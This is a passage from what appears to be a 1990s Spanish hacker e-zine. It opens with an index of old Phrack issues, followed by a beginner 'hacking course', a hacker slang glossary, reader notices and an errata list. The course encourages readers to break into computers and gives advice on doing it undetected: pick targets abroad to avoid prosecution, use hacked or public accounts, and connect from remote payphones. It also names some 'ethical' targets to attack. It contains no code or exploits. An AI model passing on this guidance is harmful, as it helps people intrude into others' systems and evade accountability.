3  Preview to Phrack 13-The Life & Times of The Executioner (4.9 k)
4  Understanding the Digital Multiplexing System (DMS) by Control C (18.8 k)
5  The Total Network Data System by Doom Prophet (13.2 k)
6  CSDC II - Hardware Requirements by The Executioner (8.1 k)
7  Hacking : OSL Systems by Evil Jay (8.7 k)
8  Busy Line Verification Part II by Phantom Phreaker (9.1 k)
9  Scan Man's Rebuttal to Phrack World News (16.5 k)
10 Phrack World News XII Part I by Knight Lightning (13.3 k)
11 Phrack World News XII Part II by Knight Lightning (14.7 k)
        
                  Phrack #13

1  Phrack XIII Index by Taran King (2.0K)
2  Real Phreaker's Guide Vol. 2 by Taran King and Knight Lightning (5.2K)
3  How to Fuck Up the World - A Parody by Thomas Covenant (9.5K)
4  How to Build a Paisley Box by Thomas Covenant and Double Helix (4.5K)
5  Phreaks In Verse by Sir Francis Drake (3.1K)
6  R.A.G. - Rodents Are Gay by Evil Jay (5.8K)
7  Are You A Phone Geek?  by Doom Prophet (8.8K)
8  Computerists Underground News Tabloid - CUNT by Crimson Death (10.5K)
9  RAGS - The Best of Sexy Exy (19.2K)
10 Phrack World News XIII by Knight Lightning (26.0 K)
        
                  Phrack #14

1  Introduction by Knight Lightning 
2  Phrack Pro-Phile X Featuring Terminus by Taran King
3  The Conscience of a Hacker {Reprint} by The Mentor 
4  The Reality of The Myth [REMOBS] by Taran King 
5  Understanding DMS Part II by Control C 
6  TRW Business Terminology by Control C
7  Phrack World News Special Edition #1 by Knight Lightning
8  Phrack World News Issue XIV/1 by Knight Lightning
9  Phrack World News Issue XIV/2 by Knight Lightning
        
                  Phrack #15

1  Phrack XV Intro by Shooting Shark                (2K)
2  More Stupid Unix Tricks by Shooting Shark        (10K)
3  Making Free Local Payfone Calls by Killer Smurf  (7K)
4  Advanced Carding XIV by The Disk Jockey          (12K)
5  Gelled Flame Fuels by Elric of Imrryr            (12K)
6  PWN I:   The Scoop on Dan The Operator by KL     (19K)
7  PWN II:  The July Busts by Knight Lightning      (21K)
8  PWN III: The Affidavit by SFD                    (6K)
        
                  Phrack #16

1  Phrack 16 Intro by Elric of Imrryr                        2K
2  BELLCORE Information by The Mad Phone-Man                11K
3  A Hacker's Guide to Primos:  Part 1 by Cosmos Kid        11K
4  Hacking GTN by The Kurgan                                 7K
5  Credit Card Laws Laws by Tom Brokow                       7K
6  Tapping Telephone Lines by Agent Steal                    9K
7  Reading Trans-Union Credit Reports by The Disk Jockey     6K
9  The Mad Phone-Man and the Gestapo by The Mad Phone-Man    2K
10 Flight of the Mad Phone-Man by The Mad Phone-Man          2K
11 Shadow Hawk Busted Again by Shooting Shark                2K
12 Coin Box Thief Wanted by The $muggler                     2K
   
                  Phrack #17
  
1  Phrack XVII Introduction           Shooting Shark         3K
2  Dun & Bradstreet Report on AT&T    Elric of Imrryr        24K
3  D&B Report on Pacific Telesis      Elric of Imrryr        26K
4  Nitrogen-Trioxide Explosive        Signal Substain        7K
5  How to Hack Cyber Systems          Grey Sorcerer          23K
6  How to Hack HP2000's               Grey Sorcerer          3K
7  Accessing Government Computers     The Sorceress          9K
8  Dial-Back Modem Security           Elric of Imrryr        11K
9  Data Tapping Made Easy             Elric of Imrryr        4K
10 PWN17.1 Bust Update                Sir Francis Drake      3K
11 PWN17.2 "Illegal" Hacker Crackdown The $muggler           5K
12 PWN17.3 Cracker are Cheating Bell  The Sorceress          8K
        
                  Phrack #18

1  Index of Phrack 18 by Crimson Death                      (02k)
2  Pro-Phile XI on Ax Murderer by Crimson Death             (04k)
3  An Introduction to Packet Switched Networks by Epsilon   (12k)
4  Primos: Primenet, RJE, DPTX by Magic Hasan               (15k)
5  Hacking CDC's Cyber by Phrozen Ghost                     (12k)
6  Unix for the Moderate by Urvile                          (11k)
7  Unix System Security Issues by Jester Sluggo             (27k)
8  Loop Maintenance Operating System by Control C           (32k)
9  A Few Things About Networks by Prime Suspect             (21k)
10 Phrack World News XVIII Part I by Epsilon                (09k)
11 Phrack World News XVIII Part II by Epsilon               (05k)
 
                  Phrack #19
 
1  Phrack Inc. Index by Crimson Death                         (02k)
2  DCL Utilities for VMS Hackers by The Mentor                (23k)
3  Digital Multiplexing Systems (Part 2) by Control C         (18k)
4  Social Security Number Formatting by Shooting Shark        (03k)
5  Facility Assignment & Control Systems by Phantom Phreaker  (11k)
6  Phrack Editorial on Microbashing by The Nightstalker       (06k)
7  Phrack World News XVIV (Part 1) by Knight Lightning        (04k)
8  Phrack World News XVIV (Part 2) by Epsilon                 (06k)
  
                  Phrack #20

1  Phrack XX Index by Taran King and Knight Lightning
2  Phrack Pro-Phile XX on Taran King
3  Timeline Featuring Taran King, Knight Lightning, and Cheap Shades
4  Welcome To Metal Shop Private by TK, KL, and CS
5  Metal/General Discussion
6  Phrack Inc./Gossip
7  Phreak/Hack Sub
8  Social Engineering
9  New Users
10 The Royal Court
11 Acronyms
12 Phrack World News XX Featuring SummerCon '88
        
                  Phrack #21

1  Index by Taran King and Knight Lightning
2  Phrack Pro-Phile on Modem Master by Taran King
3  Shadows Of A Future Past (Part 1 of the Vicious Circle Trilogy) by KL
4  The Tele-Pages by Jester Sluggo
5  Satellite Communications by Scott Holiday
6  Network Management Center by Knight Lightning and Taran King
7  Non-Published Numbers by Patrick Townsend
8  Blocking Of Long Distance Calls by Jim Schmickley
9  Phrack World News Special Edition II by Knight Lightning
10 Phrack World News Issue XXI Part 1 by Knight Lightning and Epsilon
11 Phrack World News Issue XXI Part 2 by Knight Lightning and Epsilon
        
                  Phrack #22

1  Index by Taran King and Knight Lightning
2  Phrack Pro-Phile on Karl Marx by Taran King & Knight Lightning
3  The Judas Contract (Part 2 of the Vicious Circle Trilogy) by KL
4  A Novice's Guide To Hacking (1989 Edition) by The Mentor
5  An Indepth Guide In Hacking Unix by Red Knight
6  Yet Another File On Hacking Unix by >Unknown User<
7  Computer Hackers Follow A Guttman-Like Progression by Richard C. Hollinger
8  A Report On The InterNet Worm by Bob Page
9-12 Phrack World News Issue XXII by Knight Lightning and Taran King
        
                  Phrack #23

1  Phrack Inc. XXIII Index by Knight Lightning & Taran King
2  Phrack Prophile XXIII Featuring The Mentor by Taran King
3  Subdivisions (Part 3 of The Vicious Circle Trilogy) by Knight Lightning
4  Utopia; Chapter One of FTSaga by Knight Lightning
5  Foundations On The Horizon; Chapter Two of FTSaga by Knight Lightning
6  Future Trancendent Saga Index A from the Bitnet Services Library
7  Future Trancendent Saga Index B from the Bitnet Services Library
8  Getting Serious About VMS Hacking by VAXBusters International
9  Can You Find Out If Your Telephone Is Tapped? by Fred P. Graham (& VaxCat)
10 Big Brother Online by Thumpr (Special Thanks to Hatchet Molly)
11-12 Phrack World News XXIII by Knight Lightning
        
                  Phrack #24

1  Phrack Inc. XXIV Index by Taran King and Knight Lightning
2  Phrack Pro-Phile XXIV Featuring Chanda Leir by Taran King
3  Limbo To Infinity; Chapter Three of FTSaga by Knight Lightning
4  Frontiers; Chapter Four of FTSaga by Knight Lightning
5  Control Office Administration Of Enhanced 911 Service by The Eavesdropper
6  Glossary Terminology For Enhanced 911 Service by The Eavesdropper
7  Advanced Bitnet Procedures by VAXBusters International
8  Special Area Codes by >Unknown User<
9  Lifting Ma Bell's Cloak Of Secrecy by VaxCat
10 Network Progression by Dedicated Link
11-13 Phrack World News XXIV by Knight Lightning
        
                  Phrack #25

1  Phrack Inc. XXV Index by Taran King and Knight Lightning
2  25th Anniversary Index by Knight Lightning, Taran King, and other friends
3  Bell Network Switching Systems by Taran King
4  SPAN:  Space Physics Analysis Network by Knight Lightning
5  Unix Cracking Tips by Dark OverLord
6  Hiding Out Under Unix by Black Tie Affair
7  The Blue Box And Ma Bell by The Noid
8  Hacking:  What's Legal And What's Not by Hatchet Molly
9  Phrack World News XXV/Part 1 by Knight Lightning
10 Phrack World News XXV/Part 2 by Knight Lightning
11 Phrack World News XXV/Part 3 by Knight Lightning
        
                  Phrack #26

1  Phrack Inc. XXVI Index by Taran King and Knight Lightning
2  Computer-Based Systems for Bell System Operation by Taran King
3  Getting Caught:  Legal Procedures by The Disk Jockey
4  NSFnet:  National Science Foundation Network by Knight Lightning
5  COSMOS:  COmputer System for Mainframe OperationS (Part One) by King Arthur
6  Basic Concepts of Translation by The Dead Lord and Chief Executive Officers
7  Phone Bugging:  Telecom's Underground Industry by Split Decision
8  Internet Domains:  FTSaga Appendix 3 (Limbo To Infinity) by Phrack Inc.
9  Phrack World News XXVI/Part 1 by Knight Lightning
10 Phrack World News XXVI/Part 2 by Knight Lightning
11 Phrack World News XXVI/Part 3 by Knight Lightning
        
                  Phrack #27

1  Phrack Inc. XXVII Index by Taran King and Knight Lightning
2  Operating The IBM VM/SP CP by Taran King
3  Introduction To MIDNET: Chapter Seven Of The FTS by Knight Lightning
4  NUA List For Datex-P And X.25 Networks by Oberdaemon
5  COSMOS:  COmputer System for Mainframe OperationS (Part Two) by King Arthur
6  Looking Around In DECnet by Deep Thought
7  The Making Of A Hacker by Framstag
8  Sending Fakemail In Unix by Dark OverLord
9  The Postal Inspection Service by Vendetta
10 Phrack World News XXVII/Part 1 by Knight Lightning
11 Phrack World News XXVII/Part 2 by Knight Lightning
12 Phrack World News XXVII/Part 3 by Knight Lightning
        
                  Phrack #28

1  Phrack Inc. XXVIII Index by Taran King and Knight Lightning
2  Phrack Pro-Phile XXVIII on Erik Bloodaxe by Taran King
3  Introduction to the Internet Protocols:  Chapter Eight of the FTS by KL
4  Network Miscellany by Taran King
5  A Real Functioning PEARL BOX Schematic by Dispater
6  Snarfing Remote Files by Dark OverLord
7  Other Common Carriers; A List By Equal Axis
8  Phrack World News Special Edition III (SummerCon '89) by Knight Lightning
9-12 Phrack World News XXVIII/Parts 1-4 by Knight Lightning
        
                  Phrack #29

1  Phrack Inc. XXIX Index by Taran King and Knight Lightning
2  Phrack Pro-Phile XXIX on Emmanuel Goldstein
3  Introduction to the Internet Protocols II:  Chapter Nine of the FTS by KL
4  Network Miscellany II by Taran King
5  Covert Paths by Cyber Neuron Limited and Synthecide
6  Bank Information compiled by Legion of Doom!
7  How We Got Rich Through Electronic Fund Transfer by Legion of Doom!
8  The Myth and Reality About Eavesdropping by Phone Phanatic
9  Blocking of Long-Distance Calls... Revisited by Jim Schmickley
10-12 Phrack World News XXIX/Parts 1-3 by Knight Lightning
        
                  Phrack #30

1  Phrack Inc. XXX Index by Taran King and Knight Lightning
2  Network Miscellany III by Taran King
3  Hacking & Tymnet by Synthecide
4  Hacking VM/CMS by Goe
5  The DECWRL Mail Gateway by Dedicated Link
6  Decnet Hackola : Remote Turist TTY (RTT) by *Hobbit*
7  VAX/VMS Fake Mail by Jack T. Tab
8  Consensual Realities in Cyberspace by Paul Saffo
9  The Truth About Lie Detectors by Razor's Edge
10 Western Union Telex, TWX, and Time Service by Phone Phanatic
11-12 Phrack World News XXX/Parts 1-2 by Knight Lightning
                                                (202) 697-3189 (Copies)
                  Phrack #31

1  Introduction to Phrack 31 by DH          (2K)
2  Phrack Pro-Phile of Markus Hess by PHz            (6K)
3  Hacking Rolm's CBXII by DH               (15K)
4  TAMS & Telenet Security by Phreak_Accident        (7K)
5  The history of The Legion Of Doom                 (10K)
6  Cosmos Overview by EBA                  (52k)
7  Tymnet Security Memo by Anonymous                 (9K)
8  PWN/Part01 by Phreak_Accident                     (13K)
9  PWN/Part02 by Phreak_Accident                     (17K)
10 PWN/Part03 by Phreak_Accident                    (40K)


Y el proximo numero los que quedan, del 32 al 40...




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 08. CURSO DE HACKING DESDE CERO II                                        บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Como ya habreis leido por ahi, Eljaker se va a tomar un descanso, por eso
nos hemos repartido entre algunos, los articulos que se habia dejado a 
medio. Pues resulta que a mi me ha tocado continuar este cursillo, a si
que vamos a intentar continuar mas o menos por donde Eljaker lo dejo.

Mas conceptos basicos:
----------------------

No es por dejar mal a Eljaker, pero en la primera entrega de este curso
se dejo algunos conceptos basicos, en el tintero. Como estos.

ANARQUIA o ANARKIA >> Ademas de los significados oscuros, como son caos o lio. 
La anarkia es una rama del pensamiento cyberpunk o hacker. Consiste en la 
lucha contra la sociedad. Generalmente los textos sobre anarkia, son sobre
explosivos, armas, tecnicas de lucha, etc...
>> Pensamiento ideologico y politico. No os voy a explicar aqui lo que es
la anarkia, porque seria muy extenso. (Incluso hay libros enteros sobre ello,
que os recomiendo que leais) Pero resumiendo se podria decir, que se basa
en la busqueda de la libertad y en la eliminacion de cualquier poder central
o estatal. Aunque muchos de los que dicen ser anarkistas caen en una demagogia 
barata, el movimiento anarkista tiene una gran profundidad de pensamiento,
que personalmente apoyo casi al cien por cien. La ideologia anarkista, esta
muy relacionado con el mundo hacker, ya que alguno de sus pilares son los
mismos que los de la cultura hacker, y muchos de los mejores hackers fueron
y son anarkistas. Jope, he dicho que no me iba a enrollar mucho, pero ya 
llevo un buen trozo. Bueno, lo que me queda por decir, lo dejo para un 
articulo de opinion que escribire dentro de poco y que espero que no os
parezca muy aburrido.

CYBERPUNK >> Es un tipo de ideologia o de sub-cultura. Se basa en el culto a 
la tecnologia, a la ciencia, y el odio a cualquier forma de poder organizado.
Igual que en el caso de la anarkia, se usa en muchas ocasiones con criterios
equivocados, produciendo una mala imagen de este grupo. Tambien tiene una
importante relacion con el mundo hacker.

WAREZ >> Pirateria, intercambio de programas a traves del modem. Generalmente
por internet.
>> Pirateria en general.

PATCH o PARCHE >> Modificacion de un programa anterior, con la intencion
de solucionar un bug, o para crackearlo.

PBX o PABX >> Centrales telefonicas privadas, generalmente de empresas, en
Espaคa no hay muchas, pero haberlas ailas.

BOMBAS ANSI >> Utilizando los codigos ansi, se asigna una accion destructica
a alguna tecla. Me explico, ansi es un conjunto de codigos estandar. Si en
tu ordenador tienes algun tipo de controlador de codigos ansi, cuando tu
ordenador encuentre uno de estos codigos lo ejecutara. Los codigos ansi se 
usan para varias cosas, entre ellas, cambiar los colores de la pantalla,
posicionar el cursor, y el metodo que usan las bombas ansi, asignar a una
tecla una accion determinada. Si esta accion es daคina, al pulsar la tecla
el daคo se hara. (Para mas detalles, echar un vistazo a alguna de las
otras publicaciones en espaคol, que han sacado algun articulo sobre ellas.)

ZAPPER >> Programa que se encarga de borrar las huellas (logs) que has dejado        
al entrar en un sistema.

X25 >> Es un tipo de linea de comunicaciones, como lo es la linea telefonica
normal (RTC) o la RDSI. Generalmente se usa para transmisiones de datos.
Redes de este estilo son iberpac, tymnet, etc...

SCRIPT >> Seria el equivalnete en unix, de los bat's del ms-dos, aunque mucho
mas potentes y con mas opciones, siendo casi un pequeคo lenguaje de
programacion.

INTRANET >> Red privada conectada a internet, pero generalmente aislada de
esta por un cortafuegos. 
>> Red privada que usa los mismo protocolos de comunicacion que internet
(TCP/IP) y que puede estar aislada o conectada a internet.

LOG >> Archivo que recoge un registro de tus actividades en el sistema,
almacena informacion sobre tu acceso al sistema.

*Seguro que incluso ahora, me dejo algun concepto olvidado, pero estos
van a ser los ultimos que vamos a comentar en este curso. Los conceptos 
que falten los iremos incluyendo en el diccionario de hacking, que ira siendo
actualizado periodicamente. Por ahora ya esta disponible la primera version, 
que sera de distribucion libre.

*Tambien quiero aclarar, que he descrito cada termino de la forma mas
clara que he podido para que incluso con muy pocos conociemientos se
puedan entender, ya que este curso es de iniciacion. Debido a la
extrema simplificacion de algunos temas, las explicaciones se han quedado
cortas o pueden ser erroneas, con el tiempo y cuando hayais alcanzado
un nivel de conocimientos mayor, podre pasar a explicaciones mas 
correctas.


Donde empezar a hackear:
------------------------

#Introduccion:

Despues de haber leido y estudiado todos los textos sobre hacking que
hayas podido encontar y despues de habertelo pensado muy bien, llega
el momento de intenatar el primer hack. El problema es por que ordenador
decidirte. Pues con estos consejos y con un poco de investigacion, seguro
que no vas a tener dudas.

#Requisitos que debe tener nuestro objetivo:                        

-Debe ser facil ---> Para esta condicion no hay reglas fijas. Hay algunos
sistemas operativos mas seguros que otros, pero en general la dificultad
depende de la experiencia del administrador. Lo ideal seria buscarse un
sistema nuevo (virgen) con un administrador novato. Los sistemas operativos 
antiguos tambien suelen ser mas sencillos, pero seguramente su administrador 
se las sabe todas.

-Debes conocerlo bien ---> Antes de decidirte por un sistema tienes que 
explorar mucho y buscar ordenadores, que te parezcan buenos para empezar.
Despues de elegir tu objetivo, debes observarlo e investigarlo bien, antes
de decidirte a actuar.

-Debe ser seguro ---> Esto quiere decir que sea seguro para ti. Eres
un principiante en esto y tracearte o localizarte va a ser muy facil,
por lo tanto tienes que tomar unas severas medidas de seguridad a
la hora de hackear para no ser cazado. Esta es la condicion mas 
importante, si incumples alguna de las otras condiciones, no tendras
exito en tu aventura, pero por lo menos podras volver a intentarlo, pero
si incumples esta norma y te pillan, puedes ir despidiendote de la
vida hacker. Aunque os podria dar cientos de consejos sobre como hacer
un hacking seguro, estas son las principales:
a) Hasta que no tengas un nivel alto de hacking, no lo intentes con
ordenadores que esten en tu pais. (O en paises con una legislacion
comun, por ejemplo en el caso de Espaคa, la Union Europea) Si te descubren
hackeando un ordenador en Australia, a menos que hayas hecho un destrozo
muy grande no se molestaran en venir a buscarte. En cambio si hackeas
un ordenador en la zona de influencia legal de tu pais, el administrador lo 
unico que tiene que hacer es denunciarte a la policia y ellos se encargaran 
de ir a buscarte.
b) Comienza con sistemas ilegales. Si hackeas un site warez o porno
infantil, los administradores no podran denunciarte, ya que ellos mismos
estan haciendo algo ilegal. Ademas eticamente hackear uno de estos
lugares seria aceptable.
c) Procura utilizar un ordenador que no tenga nada que ver contigo,
usa el de la universidad, el del insituto, el del cafe internet, etc...
d) Si puede ser hazlo en una red antigua. En las modernas redes de
comunicacion, cada movimiento que hagas sera observado, en cambio en
sistemas antiguos podras pasar desapercibido.
e) No hackees ordenadores de empresas o entidades poderosas, ya
que se pueden permitir gastar tiempo y dinero en buscarte.
f) Para acceder a la red, usa una cuenta publica o hackeada, por
la que no te puedan relacionar.
g) Usa un software apropiado y comprobado. (Hay algunos programas
que envian informacion tuya, sin que te enteres, como los navegadores
que usan cookies, etc...)
h) Si conoces a algun hacker ya iniciado, dile que te acompaคe
y que te ayude, para aconsejarte y 'para cubrir la retirada'.

-Debe ser interesante ---> No es una condicion imprescindible, pero cuanto
mas interesante sea tu objetivo, mas motivado estaras.

#Ordenadores que nunca debes hackear si no tienes un nivel alto:
-Del gobierno. Demasiado poderoso.
-De la compaคia telefonica. Casi mas poderosa que el gobierno.
-Que esten situados en tu pais. Por cuestiones legales y burocraticas.
-Que tengan relacion contigo. Para evitar ser identificado.
-De empresas de seguridad informatica. Saben mas que tu.
-De grandes empresas. Tienen mucho dinero para gastar en seguridad 
informatica.
-De la policia. No conviene cabrearles, por si acaso.
-De servicios secretos. En USA es un deporte nacional intentar hackear
el FBI o el pentagono, pero es bastante arriesgado.

#Ordenadores que seria etico hackear:
-Sites Warez. Siempre viene bien un programilla gratis, pero si fueseis
programadores seguro que no os gustaria que unos chavales echasen por
tierra el trabajo de varios aคos.
-Proveedores de pornografia infantil. Sin duda a estos pervertidos, hay
que hacerles algo.
-Servidores de grupos terroristas o fanaticos. Debe existir libertad de
expresion, pero los que ponen bombas se merecen que les hagamos algo.
-Ordenadores de gobiernos no democraticos. La peor tortura es la falta
de libertad. La tirania y los tiranos deben desaparecer. Con esto
me refiero a que hackear ordenadores dependientes de un estado tiranico,
seria una forma de protesta contra ellos.
-Ordenadores de traficantes de informacion. En internet, hay empresas
que trafican con informacion sobre nosotros, como si fuesemos objetos.
La informacion debe ser libre y gratis, no privada y cara.
-Timadores informaticos. Lease, cualquier otro tipo de delito
informatico.

#El ordenador ideal para hackear por primera vez seria:
-Seria un ordenador poco frecuentado, con muchos servicios abiertos,
con un administrador novato, seria virgen, con un sistema operativo
antiguo. Nosotros actuariamos desde un ordenador portatil, conectado
a una cabina telefonica, en un lugar alejado de nuestra casa y
usando una cuenta hackeada. Deberia ser un trabajo estudiado y rapido,
como es la primera vez, habra que conformarse con logros pequeคos y
no intenar llegar a root el primer dia.

Si se me ocurre alguna cosa mas os lo avisare.


Jerga:
------

La jerga de los hackers hispanos esta poco desarrollada, y se usa en
muy pocos sitios, al contrario que la jerga en ingles que esta mucho mas 
avanzada, con gran numero de palabras y incluso con diccionarios y textos 
expecificos sobre ella. (Para mas informacion buscar "The hacker's jargon")

Desde esta publicacion queremos animaros a que useis las palabras del argot 
hacker y que extendais su vocabulario. El movimiento hacker en Espaคa apenas
ha empezado a crecer en serio, por eso debemos dar un empujon a este
crecimiento, creando publicaciones especializadas y hablando sobre estos
temas en serio, y usando un vocabulario tecnico y una jerga apropiada.

El principal objetivo de la jerga, ademas de diferenciarnos del resto de
la gente que usa ordenadores y de crear un lenguaje especifico, es hacer que 
nuetras conversaciones, no puedan ser entendidas por personas ajenas. Es una 
forma de trasmitir mensajes privados o delicados, sin que los demas se 
enteren.

Devido a que muy poca gente usa palabras del argot, me ha sido dificil
hacer una lista completa. Las pocas palabras que he descubierto, las he
encontrado en la mensajeria de las bbs, por las que he estado, y me ha 
sido dificil encontrarlas y clasificarlas. Si alguien conoce o usa, otros 
terminos que aqui no aparecen, que nos las envie. 

La mayoria de estas palabras son poco usadas, pero esperemos que eso cambie
en un futuro cercano:


TELEFONO LIMPIO >> Telefono que no tiene ninguna relacion contigo y en el
que estas seguro que no te localizaran. Tiene que ser una linea telefonica
que no tenga nada que ver contigo, no tiene que dar ninguna pista sobre tu
identidad. (Por ejemplo una cabina de telefonos, alejada de donde vives)

RUIDOS EN LA LINEA >> Se dice que hay ruidos en la linea, cuando hay alguien
oyendo o interceptando la informacion que pasa por ella. Se puede usar para
indicar al otro de que hay alguien escuchando la conversacion, para que el
que esta escuchando no se entere. (Por ejemplo, cuando tu madre, espia tus
conversaciones con la novia) Tambien se usa, cuando el telefono esta pinchado.
(Por la policia o por otra persona)
-Un termino parecido tambien se emplea en mensajeria para indicar a tu
receptor, que alguien a leido tu correo privado. Se suele decir, que el 
mensaje tiene ruido, o que le mensaje esta corrompido. Una manera mas sutil 
de indicar esto es introducir una o dos lineas de caracteres extraคos, en 
el mensaje, para indicar al otro que hay un estraคo leyendo el correo 
privado.

LAMER >> Nombre generico, para los tontos informaticos, significa tonto,
novato, que sabe poco. La palabra viene de los tiempos del spectrum, y se 
aplicaba a los programadores que copiaban el codigo de otros y lo
firmaban como propio.

JACKING o DESTRIPAMIENTO >> Control total sobre algo, sobre algun sistema.
Se usa sobre todo en cracking o desproteccion de programas (debugging) cuando
se consigue un dominio total sobre el programa en ejecucion. Viene de Jack
el destripador.

ENTRAR, DARSE UN PASEO o ECHAR UN VISTAZO >> Diversas espresiones, que 
aplicadas a un sistema informatico significan, haberlo hackeado. Entrar
tiene un significado claro, mientras que los otros dos, se usan, cuando
se ha entrado, pero no se ha tocado ni hecho nada dentro. 

PESCAR o CAZAR >> Conseguir un password o una clave, o un dato valioso
a la hora de hackear.
>> Ser localizado o detenido.

ญESTAMOS DENTRO! >> Espresion de jubilo, de alegria. Se usa para celebrar
algun exito en el hacking, no solo para celebrar el haber entrado en un
sistema, sino que tambien se usa para alegrarse de cualquier logro o como
expresion de animo.

TRUCHA, PESCADO o BAKALAO >> Password, clave, o pista importante.

SALTO >> El salto es el uso de un ordenador intermedio, para acceder a algo.
Es como un puente entre tu ordenador y aquel con el que te comunicas. Sirve
para ocultar tu identidad.

SETA >> Cabina telefonica.

ENCHUFE >> Conexion telefonica, linea, clavija.

JEFE >> Sysop, administrador del sistema.

BOT o ROBOT >> Programa que automatiza una actividad o que hace alguna
tarea por si solo. Tambien se usa para referirse a los contestadores
automaticos.

LA TIMO >> Telefonica S.A.

EL GILI-PUERTAS >> Nuestro amiguito willy.

DORADO >> CD pirata, cd-rom con programas pirateados. Se llama dorado, por 
el color que suelen tener lo cd's grabables.

GORDO >> Sistema importante o muy potente.

SACO >> Lugar donde se almacenan programas o textos intereantes. Puede
ser un directorio del disco duro, una caja con disketes, etc... Tambien se
puede usar para definir el sitio donde se tiene guardado el material
delicado. (Por si no lo sabiais no es demasiado sano, tener el material
de hacking a la vista de cualquiera)

REGALO >> Fichero interesante, pero camuflado con el nombre de otro. Por
ejemplo, si en un sistema unix consigues el fichero de passwords y lo copias
a uno de tus directorios, pero le cambias el nombre por otro. Ese segundo
fichero es un 'regalo'.

TIRAR, ECHAR ABAJO o HACER CAER >> Colapsar un sistema, colgarlo, 
bloquearlo, generalmente con intenciones malignas.

MOCHILA >> Aparato que se conecta al puerto paralelo y que llevan algunos
programas comerciales para evitar su copia ilegal.

ESCOBA >> ZAPPER, programa encargado de modificar los logs, para evitar
ser detectado.

BICHO >> Script maligno, o con finalidades hack.

SISTEMA VIRGEN >> Sistema que todavia ningun hacker ha descubierto
o ha intentado hackear.
>>Sistema que todavia no ha sido hackeado por nadie.

BIBLIA >> Cuaderno donde se apuntan datos interesantes mientras se
hackea o se crackea.


Estamos pensando en hacer una seccion de la revista, en la que se traten
temas relacionados con el hacking en Espaคa, entrevistas a personajes
famosos en este mundillo, lugares de reunion habituales, etc... Estos
articulos serian los ideales, para usar la jerga, para que empeceis a
acostumbraros a ella. จQue os parece? 

Pues si estais de acuerdo empezaremos a trabajar en ello, y en el proximo
numero, espero que haya algo preparado.

ESTAMOS DENTRO, amigos

                                                        El Duke de Sicilia




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 09. AVISOS, PETICIONES, ETC...                                            บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


1. Tenemos un nuevo lugar de reunion y distribucion. Se llama AXIS y se
puede encontrar en infovia. Es un sistema totalmente gratuito que ofrece
entre otros www, ftp, telnet, irc, news, correo, etc... todo en infovia y 
!GRATISญ Y no es por hacer publicidad, pero es que, es un chollo. Pues 
algunos de nuestros miembros se pasan por alli, charlan por el irc, 
y escriben en el grupo sobre hacking de las news, si quereis conocer mas 
a fondo a algunos de los nuestros, podeis pasaros por alli.

2. Si quereis mandar algun articulo o alguna colaboracion, hacerlo a
- el_duke1@hotmail.com - o si no teneis conexion a internet, o preferis
hacerlo por infovia, podeis mandarlos a - draver@axis.inf -

3. Debido a la mala acogida de los expedientes y a otras muchas causas
hemos decidido pasar de ellos y arriegarnos a publicar cualquier
informacion libremente, esto nos puede acarrear problemas (Esperemos
que no) pero hemos decidido que la informacion debe ser libre, a 
pesar de los riesgos.

4. Segun estimaciones propias, nuestros lectores de salida, serian unas
5.000 o 10.000 personas, pero segun otras fuentes mas optimistas el numero
de lectores podria llegar a los 30.000 o 40.000. Estas segundas cifras son un
poco exageradas, pero puede que en pocos meses si podamos llegar a esos
espectaculares numeros, ya que nuestra publicacion ya empieza a circular por
bbs de todo el pais, y nos llegan noticias desde el otro lado del charco,
que nos dicen que por alli tambien nos leen. A si que con estos animos, no
podemos mas que seguir trabajando y esforzandonos para vosotros.

5. Como habeis leido, tambien tenemos lectores alla en america, pero muy 
pocos nos escriben o nos cuentan algo de lo que pasa por alli. Si alguien
de fuera de Espaคa nos lee, que nos lo diga, y que nos cuente que se opina
alli de la revista y que tal esta el panorama hacker. Saludos desde esta 
pequeคa esquina de Espaคa.

6. Bueno, y nos queda otro grupo de interes, y que se le ve muy poco por 
el underground, las mujeres. Si por alguna extraคa razon hay alguna de
vosotras leyendo esto, que nos deje un mensajillo. จQue opinais vosotras
de esto? จTambien en estos temas sois superiores a los hombres? จPor que
creeis que a las mujeres no les atrae esto? Se os ve muy poco por la red, 
animaros un poco y haceros notar. Si quereis decirme algo, o escribir un
articulillo escribid a:  
- el_duke1@hotmail.com  
y si no teneis internet, desde infovia podeis escribir a:
- draver@axis.inf

7. Nos han llegado toneladas de cartas. Intentamos responderlas a todas,
pero como nos es imposible, vamos a contestar solo las mas interesantes. Por 
eso, si nos habeis escrito, tened paciencia, porque tardaremos un poco en
contestar. Pero seguro que las leeremos todas, tranquilos. 

8. Y por favor, no pregunteis tonterias, escribirnos solo sobre los temas de 
la revista. Para otras cosas como sites warez, como configurar el netscape y 
chorradas varias esta el irc o los amigos.

9. Como sabreis, la mayoria de los nuestros tienen el correo en hotmail,
y resulta que hotmail se basa en el formato html (web) para leer el correo,
por eso algunos estan teniendo problemas con el pgp, o con ficheros
binarios, por ahora todo esta solucionado, pero si tenemos mas problemas
avisaremos a los interesados. Pero por si acaso hemos decidido cambiar de
proveedor de correo. Mientras encontramos uno que merezca nuestra confianza
podeis seguir escribiendo a las direcciones de hotmail. Cuando tengamos los
nuevos emails os lo diremos. (จAlguien nos recomienda algin servidor
de email anonimo?)




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 10. FALLOS, ERRATAS Y CORRECCIONES                                        บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Varios amigos del grupo saqueadores hemos estado revisando los primeros
numeros de la revista y hemos encontrado algunos "pequeคos" fallos. (Nadie 
es perfecto) Por eso como rectificar es de sabios, vamos a dedicar un 
articulo a revisar y aclarar algunos malentendidos.


Numero 1:
---------

ARTICULO 1. 
-...extender el crimen ni incitar a la [legalidad]-->ilegalidad  

ARTICULO 2. 
-...puedes intentarlo en un canal de habla [en ingles]-->inglesa
-Sicologia escita sin p, es aceptada por la academia de la lengua, pero
si a alguno no le gusta, que la escriba con p-->psicologia

ARTICULO 3.
-...Todo el que haya [intenetado]-->intentado 
-...este debugger es [inprescindible]-->imprescindible 
-...propiedades que otros debuggers no [tiene]-->tienen
-...->[Incnvenientes]-->inconvenientes
-...para los 2 windows, pero [queria]-->querria 

QUEDA PENDIENTE. la segunda entrega de como elegir un buen debugger. Como
